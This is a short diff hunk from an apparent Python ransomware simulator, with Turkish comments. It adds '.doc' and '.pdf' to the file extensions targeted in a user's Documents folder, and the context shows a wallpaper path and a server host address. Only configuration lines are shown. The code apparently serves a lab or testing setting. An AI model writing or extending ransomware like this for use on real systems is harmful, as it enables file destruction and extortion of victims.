@@ -93,7 +93,7 @@ class RansomwareSimulator:
         print("Memory cleared.")
 
 def main():
-    file_extensions = ['.txt', '.docx', '.jpg']
+    file_extensions = ['.txt', '.docx', '.jpg', '.doc', '.pdf']
     directory = 'C:/Users/vboxuser/Documents/'  # 'dosyalar/' should be replaced with the directory path you want to target
     wallpaper_path = r"duvarkağıtı/araba.jpg"
     server_host = '172.20.220.177'
